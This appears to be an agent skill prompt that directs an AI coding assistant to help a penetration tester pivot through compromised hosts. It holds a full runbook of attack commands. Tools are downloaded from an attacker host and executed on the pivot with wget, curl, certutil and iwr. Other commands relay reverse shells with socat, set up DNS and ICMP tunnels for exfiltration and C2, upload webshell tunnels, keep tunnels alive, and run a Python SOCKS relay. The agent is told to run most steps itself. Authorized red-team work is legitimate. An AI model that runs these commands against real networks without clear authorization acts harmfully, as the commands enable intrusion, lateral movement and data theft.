---
name: pivoting-tunneling
description: >
  Network pivoting, port forwarding, and tunneling through compromised hosts
  to reach internal networks.
keywords:
  - pivot
  - tunnel
  - port forward
  - SOCKS proxy
  - proxychains
  - access internal network
  - double pivot
  - SSH tunnel
  - ligolo
  - chisel
  - sshuttle
  - reach another subnet
  - lateral movement networking
  - I can't reach the internal network
  - set up a proxy
  - route traffic through
tools:
  - SSH
  - Ligolo-ng
  - Chisel
  - sshuttle
  - socat
  - proxychains
  - plink
  - netsh
  - dnscat2
  - iodine
  - FRP
opsec: medium
---

# Pivoting and Tunneling

You are helping a penetration tester pivot through compromised hosts to reach
internal networks. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[pivoting-tunneling] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- At least one compromised host with access to the target network
- Know the target subnet or specific internal hosts to reach
- Know what's available on the compromised host (SSH, outbound connectivity,
  installed tools, OS)

## Privileged Commands

Claude Code cannot execute `sudo` commands. The following tools require root
on the **attacker machine** and must be handed off to the user:

- **ssh -w** (VPN/tun mode) — creates tun device (requires `PermitTunnel` on both ends)
- **ip addr / ip link / ip route / ip tuntap** — network interface and route configuration
- **iptables** — NAT/masquerade rules for tunnel routing
- **sshuttle** — transparent proxy (needs root for iptables rules)
- **iodined / iodine** — DNS tunnel server/client (needs tun device)
- **hans** — ICMP tunnel (needs raw sockets)
- **ptunnel-ng** — ICMP tunnel (needs raw sockets)

**Handoff protocol:**

1. Present the full command including `sudo` to the user
2. For multi-step setups (e.g., create tun + add route + add NAT), batch
   all commands so the user can run them sequentially
3. Verify connectivity after the user confirms completion
4. Continue with proxychains configuration and tool usage

**Non-privileged commands** Claude can execute directly:
- SSH port forwarding: `ssh -L`, `ssh -R`, `ssh -D`, `ssh -J` (jump hosts)
- Chisel (client/server as user binary)
- Ligolo-ng agent (on pivot host)
- Socat port forwarding
- Plink (Windows SSH)
- Proxychains configuration and usage
- FRP client/server

**Note:** Ligolo-ng **proxy** setup requires root on the attacker machine
(`ip tuntap add`, `ip link set`, `ip route add`). The **agent** on the
pivot host runs unprivileged.

## Tool Selection Decision Tree

Choose the right tool based on what's available:

```
What access do you have on the pivot host?
│
├─ SSH access (port 22 open to you)
│  ├─ Need to reach a single port? → SSH Local Forward (-L)
│  ├─ Need a full SOCKS proxy? → SSH Dynamic Forward (-D)
│  ├─ Need to expose a service back to you? → SSH Remote Forward (-R)
│  ├─ Need transparent subnet access? → sshuttle
│  └─ Need full layer-3 VPN? → SSH VPN (tun device)
│
├─ Shell access (no SSH, but have outbound connectivity)
│  ├─ Can upload tools?
│  │  ├─ Need full subnet routing? → Ligolo-ng
│  │  ├─ Need SOCKS proxy? → Chisel reverse SOCKS
│  │  └─ Need simple port forward? → Chisel or socat
│  └─ Cannot upload tools?
│     ├─ Bash available? → /dev/tcp relay
│     └─ Python available? → Python SOCKS proxy
│
├─ Only HTTP(S) outbound
│  ├─ Webshell on target? → reGeorg / neo-reGeorg
│  └─ Can upload binary? → Chisel (HTTP tunnel mode)
│
├─ Only DNS outbound
│  └─ dnscat2 or iodine
│
├─ Only ICMP outbound
│  └─ hans or ptunnel-ng
│
├─ Windows host (no SSH)
│  ├─ RDP access? → SocksOverRDP + Proxifier
│  ├─ Admin access? → netsh portproxy
│  └─ User access? → plink (PuTTY CLI), Chisel, or Ligolo-ng
│
└─ Through a corporate proxy (NTLM auth)
   └─ rpivot or cntlm + Chisel
```

## Step 1: SSH Tunneling

SSH is the preferred pivoting tool — it's native, encrypted, leaves minimal
forensic artifacts, and is already present on most Linux/macOS systems.

### Local Port Forward (-L)

Forward a port on your attack machine to a service on/behind the pivot host.

```bash
# Forward local port 8080 to internal host 10.10.10.5 port 80 through pivot
ssh -L 8080:10.10.10.5:80 user@PIVOT_IP

# Then access: http://127.0.0.1:8080

# Forward to a service on the pivot host itself
ssh -L 3306:127.0.0.1:3306 user@PIVOT_IP

# Multiple forwards in one connection
ssh -L 8080:10.10.10.5:80 -L 445:10.10.10.5:445 -L 3389:10.10.10.10:3389 user@PIVOT_IP

# Background the tunnel (no interactive shell)
ssh -L 8080:10.10.10.5:80 -N -f user@PIVOT_IP
# -N = no remote command, -f = background after auth
```

**Use case:** Access a specific internal service (web app, database, RDP) through
the pivot. Simple, reliable, no tools needed.

### Dynamic SOCKS Proxy (-D)

Create a SOCKS proxy on your attack machine that routes traffic through the pivot.

```bash
# SOCKS5 proxy on local port 1080
ssh -D 1080 user@PIVOT_IP -N -f

# Then use with proxychains
proxychains nmap -sT -sV -p- 10.10.10.5
proxychains curl http://10.10.10.5/
proxychains firefox

# Or configure tools directly
curl --socks5 127.0.0.1:1080 http://10.10.10.5/
nmap --proxies socks4://127.0.0.1:1080 -sT 10.10.10.5
```

**proxychains configuration (`/etc/proxychains4.conf` or `~/.proxychains/proxychains.conf`):**

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

**Use case:** Route arbitrary traffic to the internal network. Works with most
tools via proxychains. Preferred when you need to scan or interact with
multiple internal hosts.

**Note:** SOCKS proxies only handle TCP. UDP and ICMP don't traverse SOCKS.
This means `ping` won't work, nmap must use `-sT` (connect scan) not `-sS`
(SYN scan), and UDP services need a different approach.

### Remote Port Forward (-R)

Expose a port from the pivot host (or internal network) back to your attack machine.
Useful when the pivot can reach you but you can't initiate connections to it.

```bash
# Expose pivot's port 80 as port 8080 on your attack machine
ssh -R 8080:127.0.0.1:80 attacker@ATTACKER_IP -N -f

# Expose internal host through pivot
ssh -R 8080:10.10.10.5:80 attacker@ATTACKER_IP -N -f

# Reverse SOCKS proxy (pivot sends SOCKS back to attacker)
ssh -R 1080 attacker@ATTACKER_IP -N -f
# Requires GatewayPorts yes in attacker's sshd_config
```

**Use case:** Pivot host can reach your attacker machine but you can't reach the
pivot directly (e.g., NAT, firewall, VPN). Run the SSH command from the pivot.

### SSH Escape Sequence (~C)

Add forwards to an existing SSH session without disconnecting.

```
# In an active SSH session, press Enter then ~C
ssh> -L 8080:10.10.10.5:80
Forwarding port.
ssh> -D 1080
Forwarding port.
```

**Useful when** you realize you need a forward mid-session without losing your shell.

### ProxyJump (-J) — Multi-Hop

Chain SSH through multiple pivot hosts.

```bash
# Jump through PIVOT1 to reach PIVOT2
ssh -J user@PIVOT1_IP user@PIVOT2_IP

# Multiple jumps
ssh -J user@PIVOT1_IP,user@PIVOT2_IP user@FINAL_TARGET

# With SOCKS proxy on the final hop
ssh -J user@PIVOT1_IP -D 1080 user@PIVOT2_IP -N -f

# Equivalent ~/.ssh/config
Host pivot1
    HostName PIVOT1_IP
    User user

Host pivot2
    HostName PIVOT2_IP
    User user
    ProxyJump pivot1

Host internal
    HostName 10.10.10.5
    User user
    ProxyJump pivot2
```

**Use case:** Multi-hop pivoting through several compromised hosts to reach
deeply segmented networks.

### sshuttle — Transparent VPN over SSH

Routes traffic at the IP level — no SOCKS configuration needed. Tools work
natively without proxychains.

```bash
# Route all traffic to 10.10.10.0/24 through pivot
sshuttle -r user@PIVOT_IP 10.10.10.0/24

# Multiple subnets
sshuttle -r user@PIVOT_IP 10.10.10.0/24 172.16.0.0/16

# Exclude your SSH connection from being routed (important!)
sshuttle -r user@PIVOT_IP 10.10.10.0/24 -x PIVOT_IP

# DNS forwarding (also route DNS queries through pivot)
sshuttle --dns -r user@PIVOT_IP 10.10.10.0/24

# With SSH key
sshuttle -r user@PIVOT_IP --ssh-cmd "ssh -i /path/to/key" 10.10.10.0/24

# Verbose mode for troubleshooting
sshuttle -r user@PIVOT_IP 10.10.10.0/24 -vvv
```

**Advantages over SSH -D:**
- No proxychains needed — tools work natively (including nmap -sS)
- UDP support (with `--method tproxy` and root on attacker)
- DNS forwarding
- Transparent to all applications

**Limitations:**
- Requires Python on the pivot host
- Requires root/sudo on the attacker machine (uses iptables/pf)
- Cannot route to the pivot host's own IP (use `-x` to exclude)

**Use case:** Best option when you have SSH access and need transparent subnet
routing without configuring every tool for SOCKS.

### SSH VPN (TUN Device)

Full layer-3 VPN using SSH's built-in tunnel support.

```bash
# On attacker (requires PermitTunnel yes in pivot's sshd_config)
sudo ssh -w 0:0 user@PIVOT_IP

# On attacker — configure tunnel interface
sudo ip addr add 10.0.0.1/30 dev tun0
sudo ip link set tun0 up
sudo ip route add 10.10.10.0/24 via 10.0.0.2

# On pivot — configure tunnel interface
sudo ip addr add 10.0.0.2/30 dev tun0
sudo ip link set tun0 up
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/30 -o eth0 -j MASQUERADE
```

**Use case:** Rarely needed — sshuttle handles most cases better. Use when you
need full layer-3 access including ICMP, UDP, and raw sockets, and the pivot's
sshd_config allows tunnel devices.

## Step 2: Ligolo-ng

Full TUN-based tunnel with agent/proxy architecture. Provides transparent subnet
routing like sshuttle but works without SSH. The agent runs on the pivot; the
proxy runs on your attacker machine.

### Setup

```bash
# On attacker — create TUN interface and start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (listens for agent connections)
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot — run agent (connects back to attacker)
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

### Routing

```bash
# In Ligolo proxy console — select the agent session
session
# Select the session number

# Add route to internal subnet through the tunnel
sudo ip route add 10.10.10.0/24 dev ligolo

# Start the tunnel
start

# Verify routing
ip route | grep ligolo
ping 10.10.10.5  # Should work through the tunnel
```

### Port Forwarding (Listener)

Expose internal ports or redirect traffic through the agent.

```bash
# In Ligolo proxy console — forward attacker:8080 to internal 10.10.10.5:80
listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80 --tcp

# Forward pivot's local port back to attacker
listener_add --addr 0.0.0.0:3306 --to 127.0.0.1:3306 --tcp

# List listeners
listener_list

# Remove listener
listener_stop 0
```

### Double Pivot

Chain through multiple agents.

```bash
# Agent 1 connects to proxy on attacker
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Add route to Agent 2's network
sudo ip route add 10.10.20.0/24 dev ligolo

# Add listener on Agent 1 to relay Agent 2's connection
# In proxy console (session 1):
listener_add --addr 0.0.0.0:11601 --to ATTACKER_IP:11601 --tcp

# Agent 2 connects through Agent 1
./agent -connect AGENT1_IP:11601 -ignore-cert

# Add route to Agent 2's internal network
sudo ip route add 10.10.30.0/24 dev ligolo
```

### Transfer Agent to Pivot

```bash
# Python HTTP server on attacker
python3 -m http.server 8000

# Download on pivot (Linux)
wget http://ATTACKER_IP:8000/agent -O /tmp/agent && chmod +x /tmp/agent
curl http://ATTACKER_IP:8000/agent -o /tmp/agent && chmod +x /tmp/agent

# Download on pivot (Windows)
certutil -urlcache -f http://ATTACKER_IP:8000/agent.exe C:\Windows\Temp\agent.exe
iwr http://ATTACKER_IP:8000/agent.exe -OutFile C:\Windows\Temp\agent.exe
```

**Advantages:**
- Full TUN interface — all tools work natively (nmap SYN scan, ping, UDP)
- No proxychains needed
- Works on both Linux and Windows pivots
- Clean agent/proxy architecture
- Built-in port forwarding

**Limitations:**
- Requires uploading a binary to the pivot (OPSEC consideration)
- TLS certificate fingerprint is detectable
- Requires root/sudo on attacker for TUN interface

**Use case:** Preferred non-SSH option. Best when you need transparent subnet
access and have the ability to upload a binary.

## Step 3: Chisel

Reverse SOCKS proxy and port forwarding over HTTP. Works through HTTP proxies
and firewalls that allow outbound HTTP/HTTPS.

### Reverse SOCKS Proxy

```bash
# On attacker — start Chisel server
./chisel server --reverse --port 8000

# On pivot — connect back and create reverse SOCKS
./chisel client ATTACKER_IP:8000 R:socks

# SOCKS5 proxy is now available at 127.0.0.1:1080 on attacker
# Configure proxychains:
# socks5 127.0.0.1 1080

# Then use:
proxychains nmap -sT -sV 10.10.10.5
proxychains curl http://10.10.10.5/
```

### Port Forwarding

```bash
# Forward attacker:8080 to internal 10.10.10.5:80 through pivot
# On attacker:
./chisel server --reverse --port 8000
# On pivot:
./chisel client ATTACKER_IP:8000 R:8080:10.10.10.5:80

# Forward multiple ports
./chisel client ATTACKER_IP:8000 R:8080:10.10.10.5:80 R:445:10.10.10.5:445 R:3389:10.10.10.10:3389

# Local forward (from pivot's perspective)
./chisel client ATTACKER_IP:8000 8080:10.10.10.5:80
```

### Through an HTTP Proxy

```bash
# Chisel through a corporate proxy
./chisel client --proxy http://PROXY_IP:3128 ATTACKER_IP:8000 R:socks

# With proxy authentication
./chisel client --proxy http://user:pass@PROXY_IP:3128 ATTACKER_IP:8000 R:socks
```

### TLS Encryption

```bash
# Server with TLS (looks like HTTPS traffic)
./chisel server --reverse --port 443 --tls-key server.key --tls-cert server.crt

# Client
./chisel client --fingerprint SERVER_FINGERPRINT ATTACKER_IP:443 R:socks
```

### Transfer Chisel to Pivot

```bash
# Linux
wget http://ATTACKER_IP:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
curl http://ATTACKER_IP:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel

# Windows
certutil -urlcache -f http://ATTACKER_IP:8000/chisel.exe C:\Windows\Temp\chisel.exe
iwr http://ATTACKER_IP:8000/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
```

**Advantages:**
- Single binary, cross-platform
- Works through HTTP proxies
- TLS support (blends with HTTPS traffic)
- Reverse connections (pivot connects to you)

**Limitations:**
- SOCKS proxy only (no transparent routing like Ligolo-ng)
- Requires proxychains for most tools
- Binary upload required (detectable by EDR)

**Use case:** When SSH isn't available and you need a SOCKS proxy. Excels in
environments with restrictive firewalls that only allow HTTP/HTTPS outbound.

## Step 4: socat

Swiss-army knife for network relaying. Useful for simple port forwards and
bidirectional connections.

### Port Forwarding

```bash
# Forward pivot:8080 to internal host 10.10.10.5:80
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80

# Background it
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80 &

# With bind address (listen only on specific interface)
socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.10.5:80
```

### Encrypted Relay

```bash
# Generate cert (on attacker)
openssl req -newkey rsa:2048 -nodes -keyout relay.key -x509 -days 365 -out relay.crt
cat relay.key relay.crt > relay.pem

# SSL-encrypted relay
socat OPENSSL-LISTEN:443,cert=relay.pem,verify=0,fork TCP:10.10.10.5:80
```

### Reverse Shell Relay

```bash
# Relay through pivot to reach attacker's listener
# On pivot — forward pivot:4444 to attacker:4444
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444

# Target's reverse shell connects to PIVOT_IP:4444
# Traffic relayed to ATTACKER_IP:4444
```

### UDP Relay

```bash
# Forward UDP (e.g., for DNS or SNMP)
socat UDP-LISTEN:53,fork UDP:10.10.10.5:53
```

**Use case:** Quick port forwards on a pivot host. Often already installed.
No SOCKS support — use for forwarding specific ports.

## Step 5: Windows Pivoting

### netsh portproxy (Built-in, Admin Required)

```powershell
# Forward pivot:8080 to internal 10.10.10.5:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5

# Forward pivot:4445 to internal 10.10.10.5:445
netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.10.5

# List all forwards
netsh interface portproxy show all

# Remove a forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Open firewall for the forwarded port
netsh advfirewall firewall add rule name="pivot_8080" protocol=TCP dir=in localport=8080 action=allow
```

**Advantages:** Built-in, no tools to upload. **Limitations:** Admin required,
TCP only, no SOCKS, no encryption. Each forward is a separate rule.

### plink (PuTTY CLI)

```powershell
# Dynamic SOCKS proxy (like ssh -D)
plink.exe -ssh -D 1080 -N user@ATTACKER_IP

# Local port forward
plink.exe -ssh -L 8080:10.10.10.5:80 -N user@ATTACKER_IP

# Remote port forward (reverse)
plink.exe -ssh -R 8080:10.10.10.5:80 -N user@ATTACKER_IP

# Non-interactive (accept host key automatically)
echo y | plink.exe -ssh -D 1080 -N -pw PASSWORD user@ATTACKER_IP
```

**Use case:** SSH-style tunneling from a Windows pivot. Requires plink.exe
upload but familiar SSH syntax.

### SocksOverRDP

Creates a SOCKS proxy over an existing RDP session.

```
# Setup:
# 1. On attacker: place SocksOverRDP-Plugin.dll and SocksOverRDP-Server.exe
# 2. Connect via RDP to pivot
# 3. In RDP session, run SocksOverRDP-Server.exe
# 4. Load SocksOverRDP-Plugin.dll in mstsc (register as RDP virtual channel)
# 5. SOCKS proxy available on attacker at 127.0.0.1:1080
```

```powershell
# On pivot (in RDP session)
.\SocksOverRDP-Server.exe

# On attacker — configure Proxifier or proxychains
# SOCKS5 127.0.0.1 1080
```

**Use case:** When you only have RDP access to the pivot and need to proxy
tools through it. Requires Proxifier on Windows attacker or proxychains on Linux.

### Chisel / Ligolo-ng on Windows

Both have Windows binaries. Usage is identical to the Linux sections above:

```powershell
# Chisel reverse SOCKS from Windows pivot
.\chisel.exe client ATTACKER_IP:8000 R:socks

# Ligolo-ng agent from Windows pivot
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

## Step 6: DNS Tunneling

When only DNS traffic can leave the network. Slow but effective for exfiltration
and basic command channels.

### dnscat2

```bash
# On attacker — start DNS server
ruby dnscat2.rb tunnel.attacker.com

# On pivot — connect via DNS
./dnscat tunnel.attacker.com

# In dnscat2 console:
# List sessions
sessions

# Interact with session
session -i 1

# Port forward through DNS tunnel
listen 127.0.0.1:8080 10.10.10.5:80

# Spawn a shell
shell
```

### iodine

Full IP tunnel over DNS (higher throughput than dnscat2).

```bash
# On attacker — start iodine server (needs root + real DNS delegation)
sudo iodined -f -c -P password 10.0.0.1/24 tunnel.attacker.com

# On pivot — connect
sudo iodine -f -P password tunnel.attacker.com

# TUN interface created — route traffic through it
# On attacker:
sudo ip route add 10.10.10.0/24 via 10.0.0.2
```

**Requirements:** Attacker must own a domain with NS record pointing to the
attacker's IP. DNS (port 53 UDP) must be allowed outbound from pivot.

**Use case:** Last resort when HTTP/TCP egress is blocked but DNS is allowed.
Slow (10-50 KB/s typical) but functional for C2 and light scanning.

## Step 7: ICMP Tunneling

When only ICMP (ping) traffic can leave the network.

### hans

```bash
# On attacker
sudo ./hans -s 10.0.0.1 -p password

# On pivot
sudo ./hans -c ATTACKER_IP -p password

# TUN interface created — route through it
sudo ip route add 10.10.10.0/24 via 10.0.0.100
```

### ptunnel-ng

```bash
# On attacker — start ICMP tunnel server
sudo ./ptunnel-ng -r ATTACKER_IP -R 22

# On pivot — connect through ICMP
sudo ./ptunnel-ng -p ATTACKER_IP -l 2222 -r 127.0.0.1 -R 22

# Now SSH through the ICMP tunnel
ssh -p 2222 user@127.0.0.1
```

**Use case:** Extremely restricted environments. Requires root/sudo on both ends.
Very slow, but proves connectivity for exfiltration.

## Step 8: HTTP Tunneling (Webshell-Based)

When you only have webshell access (no interactive shell) on the pivot.

### neo-reGeorg

```bash
# On attacker — generate tunnel webshell
python neoreg.py generate -k password

# Upload the appropriate webshell to the target web server:
# tunnel.aspx, tunnel.php, tunnel.jsp, tunnel.ashx

# Start the tunnel (creates SOCKS proxy)
python neoreg.py -k password -u http://TARGET_IP/tunnel.php

# SOCKS proxy available at 127.0.0.1:1080
proxychains nmap -sT 10.10.10.0/24
```

### rpivot (NTLM Proxy Bypass)

For environments behind an NTLM-authenticating proxy.

```bash
# On attacker
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

# On pivot
python client.py --server-ip ATTACKER_IP --server-port 9999

# With NTLM proxy auth
python client.py --server-ip ATTACKER_IP --server-port 9999 --ntlm-proxy-ip PROXY_IP --ntlm-proxy-port 8080 --domain CORP --username user --password pass
```

**Use case:** Corporate environments with NTLM-authenticated proxies that block
direct outbound connections.

## Step 9: Metasploit Pivoting

When using Metasploit for the overall engagement.

```bash
# After getting a Meterpreter session
# Add route to internal network through session
run autoroute -s 10.10.10.0/24

# Or manually
route add 10.10.10.0 255.255.255.0 SESSION_ID

# List routes
route print

# Start SOCKS proxy module
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Port forward through session
portfwd add -l 8080 -p 80 -r 10.10.10.5

# List forwards
portfwd list

# Remove forward
portfwd delete -l 8080 -p 80 -r 10.10.10.5
```

**proxychains with Metasploit SOCKS:**

```ini
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```

**Use case:** When already in Metasploit. Autoroute makes all Metasploit modules
work through the pivot transparently.

## Step 10: FRP (Fast Reverse Proxy)

Advanced reverse proxy with dashboard and configuration file.

```ini
# frps.toml (on attacker)
[common]
bind_port = 7000

# frpc.toml (on pivot)
[common]
server_addr = ATTACKER_IP
server_port = 7000

# SOCKS5 proxy
[[proxies]]
name = "socks5"
type = "tcp"
remote_port = 1080
[proxies.plugin]
type = "socks5"

# Port forward
[[proxies]]
name = "web"
type = "tcp"
local_ip = "10.10.10.5"
local_port = 80
remote_port = 8080
```

```bash
# On attacker
./frps -c frps.toml

# On pivot
./frpc -c frpc.toml
```

**Use case:** Long-running tunnels with multiple forwards. Configuration file
approach is cleaner for complex setups.

## Step 11: Public Tunnel Services

For scenarios where the pivot has internet access but the attacker doesn't have
a public IP.

```bash
# ngrok (TCP tunnel — requires ngrok account)
ngrok tcp 4444
# Gives you a public URL like tcp://0.tcp.ngrok.io:12345
# Point reverse shells at this address

# cloudflared (Cloudflare Tunnel — free)
cloudflared tunnel --url tcp://localhost:4444
```

**OPSEC warning:** Traffic goes through third-party infrastructure. Only use in
CTF/lab environments. Not appropriate for real engagements.

## Step 12: Multi-Hop Scenarios

Chaining pivots through multiple compromised hosts.

### Double Pivot with SSH

```bash
# Method 1: ProxyJump (cleanest)
ssh -J user@PIVOT1 -D 1080 user@PIVOT2 -N -f
# SOCKS proxy routes: attacker → PIVOT1 → PIVOT2 → internal network

# Method 2: Chain sshuttle
# First hop
sshuttle -r user@PIVOT1 PIVOT2_SUBNET/24 -x PIVOT1_IP
# Second hop (runs through first tunnel)
sshuttle -r user@PIVOT2 INTERNAL_SUBNET/24 -x PIVOT2_IP
```

### Double Pivot with Ligolo-ng

See Step 2 "Double Pivot" section — use listener chaining.

### Double Pivot with Chisel

```bash
# Attacker: Chisel server
./chisel server --reverse --port 8000

# PIVOT1: Client → reverse SOCKS + server for next hop
./chisel client ATTACKER_IP:8000 R:socks &
./chisel server --port 9000

# PIVOT2: Client → connects through PIVOT1 to ATTACKER
# (need proxychains on PIVOT1, or use Chisel's built-in forward)
./chisel client PIVOT1_IP:9000 R:1081:socks

# proxychains config with chained SOCKS:
# socks5 127.0.0.1 1081  (for traffic through both pivots)
```

### Proxychains Chaining

```ini
# /etc/proxychains4.conf
# Chain multiple proxies (strict = must traverse all in order)
strict_chain

[ProxyList]
socks5 127.0.0.1 1080  # First pivot
socks5 127.0.0.1 1081  # Second pivot
```

## Step 13: Verifying Tunnel Connectivity

After establishing any tunnel, verify it works before proceeding.

```bash
# Through SOCKS proxy
proxychains curl -s http://10.10.10.5/ -o /dev/null -w "%{http_code}\n"
proxychains nc -zv 10.10.10.5 445

# Through transparent tunnel (sshuttle, Ligolo-ng)
ping -c 3 10.10.10.5
nmap -sT -p445 10.10.10.5
curl http://10.10.10.5/

# Through local port forward
curl http://127.0.0.1:8080/
nc -zv 127.0.0.1 8080

# DNS resolution through tunnel
proxychains nslookup dc01.corp.local 10.10.10.1
proxychains dig @10.10.10.1 corp.local
```

**Common verification issues:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| Connection refused | Tunnel not running or wrong port | Check tunnel process, verify port numbers |
| Connection timeout | Firewall or routing issue | Check routes, verify pivot can reach target |
| DNS not resolving | DNS not routed through tunnel | Use `--dns` with sshuttle, or set DNS server explicitly |
| nmap SYN scan fails | SOCKS proxy doesn't support raw sockets | Use `-sT` (connect scan) with proxychains |
| Tools hang with proxychains | Tool not compatible with SOCKS | Use transparent tunnel (sshuttle/Ligolo-ng) instead |

## Step 14: Tool Compatibility with SOCKS Proxies

Not all tools work through proxychains. This table covers common pentesting tools:

| Tool | proxychains | Notes |
|------|-------------|-------|
| nmap | Partial | Must use `-sT` (connect scan), no SYN/UDP/ping |
| curl / wget | Yes | Works natively with `--socks5` too |
| netexec | Yes | Works well through proxychains |
| impacket-* | Yes | Most tools work; some need `--dc-ip` explicitly |
| sqlmap | Yes | Works through proxychains |
| gobuster / ffuf | Yes | May be slow; reduce threads |
| nikto | Yes | Works through proxychains |
| hydra | Yes | Use `-s` for port if forwarded |
| smbclient | Yes | Works through proxychains |
| evil-winrm | Yes | Works through proxychains |
| bloodhound-python | Yes | Needs `--dns-tcp` and `--dc-ip` |
| Burp Suite | Configure | Set SOCKS proxy in Burp's settings |
| Firefox | Configure | Set SOCKS proxy in network settings, enable DNS over SOCKS |
| Metasploit | Partial | Use `set Proxies socks5:127.0.0.1:1080` |
| responder | No | Needs raw sockets — use transparent tunnel |
| ping | No | ICMP not supported over SOCKS |

**For tools that don't work with SOCKS**, use sshuttle or Ligolo-ng for
transparent routing.

## Step 15: Maintaining Persistent Tunnels

### Keep-alive and Reconnection

```bash
# SSH with keep-alive (prevent timeout)
ssh -D 1080 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@PIVOT_IP -N -f

# autossh (auto-reconnect on failure)
autossh -M 0 -D 1080 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -N -f user@PIVOT_IP

# Chisel with reconnect
./chisel client --keepalive 25s ATTACKER_IP:8000 R:socks
```

### Background Management

```bash
# Find SSH tunnel PIDs
ps aux | grep "ssh.*-D\|ssh.*-L\|ssh.*-R" | grep -v grep

# Kill specific tunnel
kill PID

# Find Chisel/Ligolo processes
ps aux | grep -E "chisel|agent|proxy" | grep -v grep
```

### Screen/tmux for Tunnel Management

```bash
# Dedicated tmux session for tunnels
tmux new -s tunnels

# Window 0: SSH SOCKS proxy
ssh -D 1080 user@PIVOT_IP -N

# Window 1: Ligolo-ng proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Window 2: Working shell (with proxychains)
proxychains bash
```

## Troubleshooting

### SSH tunnel dies after inactivity

Add keep-alive settings:
```bash
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 ...
```
Or use `autossh` for automatic reconnection.

### proxychains DNS leaks

By default proxychains may leak DNS. Fix in `/etc/proxychains4.conf`:
```ini
proxy_dns
# Ensure this line is uncommented
```
Or use sshuttle with `--dns` flag.

### "Channel open failed" / "administratively prohibited"

The SSH server is blocking TCP forwarding. Check the pivot's `/etc/ssh/sshd_config`:
```
AllowTcpForwarding yes
GatewayPorts yes        # For remote forwards binding to 0.0.0.0
PermitTunnel yes        # For SSH VPN (tun device)
```
If you can't modify sshd_config, use Chisel or Ligolo-ng instead.

### Tunnel is slow

1. Check bandwidth between attacker and pivot: `iperf3` if available
2. Reduce parallel connections through the tunnel
3. For SOCKS: reduce tool thread count (`ffuf -t 5`, `gobuster -t 5`)
4. DNS tunnels are inherently slow (10-50 KB/s) — accept it or find HTTP egress
5. Compression: `ssh -C -D 1080 user@PIVOT_IP` (helps on slow links)

### Cannot upload tools to pivot

Use techniques that don't require uploads:
1. SSH tunneling (already on the host)
2. `socat` (often pre-installed)
3. Bash `/dev/tcp` relays (no tools needed)
4. Python one-liners (if Python is available):

```python
# Minimal SOCKS4 proxy in Python (run on pivot)
python3 -c "
import socket,select,threading
def relay(src,dst):
    while True:
        r,_,_ = select.select([src,dst],[],[],5)
        if src in r:
            d = src.recv(4096)
            if not d: break
            dst.sendall(d)
        if dst in r:
            d = dst.recv(4096)
            if not d: break
            src.sendall(d)
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 1080))
s.listen(5)
print('SOCKS relay on :1080')
while True:
    c,a = s.accept()
    d = c.recv(9)
    port = int.from_bytes(d[2:4],'big')
    ip = socket.inet_ntoa(d[4:8])
    c.sendall(b'\x00\x5a' + d[2:8])
    r = socket.socket()
    r.connect((ip,port))
    threading.Thread(target=relay,args=(c,r),daemon=True).start()
"
```

### Ligolo-ng agent can't connect back

1. Check firewall on attacker allows inbound on port 11601
2. Check pivot has outbound access to attacker's IP
3. Try a different port: `./proxy -selfcert -laddr 0.0.0.0:443`
4. If HTTP proxy required, use Chisel instead (has HTTP proxy support)

### Windows pivot — no admin for netsh

Use plink, Chisel, or Ligolo-ng agent — all work as regular user.
```powershell
# plink (no admin needed)
plink.exe -ssh -D 1080 -N user@ATTACKER_IP

# Chisel (no admin needed)
.\chisel.exe client ATTACKER_IP:8000 R:socks
```
